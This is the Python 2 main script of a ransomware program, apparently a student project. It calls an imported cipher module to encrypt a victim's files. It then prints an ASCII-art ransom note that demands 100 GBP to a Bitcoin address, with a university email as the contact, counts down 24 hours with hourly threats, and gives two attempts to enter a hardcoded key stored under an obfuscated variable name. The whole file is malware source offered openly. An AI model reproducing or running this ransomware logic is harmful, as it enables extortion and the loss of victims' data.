import os, sys, time, keyboard

from ProductCipher import *

# This script will encrypt the victim's files
# Present them with instructions on how to pay the ransom
# Prompt them to input key to decrypt files after 24 hours
# Decrypt their files if the key entered is correct
# Debug messages along with any code that doesn't work/isn't being used has been commented out

# Set dimensions of cmd prompt
os.system('mode con: cols=175 lines=45')

# Pseudo-random number generated by RNG to be used as the ecryption/decryption key
# Given a pseudo-random name in case variable name is retrieved from reverse engineering
ajIXXtKl6fGvkz5MUdS9 = 4488494747201394700

# Number of times the victim has tried to enter a decryption key
key_entry_attempts = 0

# Instructions displayed to the victim
instructions = """

                                                            NO!                          MNO!
                                                        MNO!!         [NBK]          MNNOO!
                                                        MMNO!                           MNNOO!!
                                                        MNOONNOO!   MMMMMMMMMMPPPOII!   MNNO!!!!
                                                        !O! NNO! MMMMMMMMMMMMMPPPOOOII!! NO!
                                                            ! MMMMMMMMMMMMMPPPPOOOOIII! !
                                                            MMMMMMMMMMMMPPPPPOOOOOOII!!
                                                            MMMMMOOOOOOPPPPPPPPOOOOMII!
                                                            MMMMM..    OPPMMP    .,OMI!
                                                            MMMM::   o.,OPMP,.o   ::I!!
                                                                NNM:::.,,OOPM!P,.::::!!
                                                                MMNNNNNOOOOPMO!!IIPPO!!O!
                                                                MMMMMNNNNOO:!!:!!IPPPPOO!
                                                                MMMMMNNOOMMNNIIIPPPOO!!
                                                                    MMMONNMMNNNIIIOO!
                                                                MN MOMMMNNNIIIIIO! OO
                                                                MNO! IiiiiiiiiiiiI OOOO
                                                        NNN.MNO!   O!!!!!!!!!O   OONO NO!
                                                        MNNNNNO!    OOOOOOOOOOO    MMNNON!
                                                            MNNNNO!    PPPPPPPPP    MMNON!
                                                                OO!                   ON!

YOUR FILES ARE BEING ENCRYPTED AS YOU READ THIS MESSAGE. DO NOT CLOSE THIS OR SHUT DOWN YOUR PC AS YOU WILL NEVER BE ABLE TO DECRYPT YOUR FILES.

YOU HAVE 24 HOURS TO DO THE FOLLOWING...
Send 100 GBP to this Bitcoin address: 3DUjJWQJBBheTwfK8MCA7r9v1ifga9i5Mo
When you have paid, send an e-mail to faran.azadi@stu.mmu.ac.uk with your payment details. You will recieve an e-mail back containing the decryption key.

Please wait to be prompted to enter the key. 
You have 2 attempts to enter it correctly or the program will terminate and your files stay encrypted.

WARNING: LEAVE YOUR PC POWERED ON AND DO NOT CLOSE THIS WINDOW.
        """
print instructions # Wouldn't use a personal e-mail if this was real ransomware, probably use some anonymous e-mail provider off the dark web

# Encrypt the victim's files
prod_cipher = ProductCipher(ajIXXtKl6fGvkz5MUdS9)
prod_cipher.encrypt_victims_files()

# Keep loop running for 24 hours 
hours = 0
while hours != 24: 
    print '~~~~~~~~~~~~~~~~~~~~~~~~~ HOURLY UPDATE ~~~~~~~~~~~~~~~~~~~~~~~~~'
    print '%s hour(s) elapsed. Pay the ransom now to get all of your files back.' %hours
    # Sleep for an hour
    time.sleep(3600) #3600 secs in an hour
    hours += 1

# Tried to get this to work inside a loop and by itself but couldn't for some reason...
#if keyboard.is_pressed('k'): # When 'k' is pressed, skip to key entry by setting time limit to max
#   k_pressed = True
#   print 'Skipping to key entry stage...'
#   break # Come out of loop     

print '~~~~~~~~~~~~~~~~~~~~~~~~~ !!! TIME IS UP - ENTER YOUR DECRYPTION KEY !!! ~~~~~~~~~~~~~~~~~~~~~~~~~'
print 'You have 5 minutes and 2 attempts to enter the key correctly.'
print 'If you enter the key incorrectly more than 2 times or take longer than 5 mins, your files will remain encrypted.'

# Convert to int so it can be used to check for equality
key_entered = int(input("Input the EXACT key sent to you via e-mail:")) 
print 'Key entered: %s' %key_entered
 
print '~~~~~~~~~~~~~~~~~~~~~~~~~ VALIDATING KEY ~~~~~~~~~~~~~~~~~~~~~~~~~' 

# I thought a way to stop brute force attacks on the key is to only allow a limited number of attempts to enter it correctly
# Please excuse this messy code, I'm sure there's a better way of doing it

end_time = time.time() + 60 * 5 # Add 5 minutes onto the time from now
while time.time() < end_time: # Enter loop as long as time hasn't exceeded time limit (5 mins) 
   if key_entry_attempts < 2 and key_entered == ajIXXtKl6fGvkz5MUdS9: # If victim has enough attempts & enters correct key
      print 'The key you entered is correct.'
      print 'Decrypting your files...'
      # Decrypt victim's files
      prod_cipher.decrypt_victims_files()
      sys.exit()
   elif key_entry_attempts < 2 and key_entered != ajIXXtKl6fGvkz5MUdS9: # If victim has enough attempts & enters incorrect key
      print 'The key you entered is incorrect, please try again. You have one more attempt left.'
      key_entry_attempts = key_entry_attempts + 1
      key_entered2 = int(input("This is your last attempt. Enter the key again:")) # Prompt for another key
      if key_entered2 == ajIXXtKl6fGvkz5MUdS9: # If the second key entered is correct, decrypt files
         print 'The second key you entered is correct.'
         print 'Decrypting your files...'
         # Decrypt victim's files
         prod_cipher.decrypt_victims_files()
         sys.exit()
      elif key_entered2 != ajIXXtKl6fGvkz5MUdS9: # If incorrect key entered twice, this will make sure the program exits
         print 'Incorrect key entered twice.'
         key_entry_attempts = key_entry_attempts + 1
   else:
      print 'Exiting...'
      sys.exit()
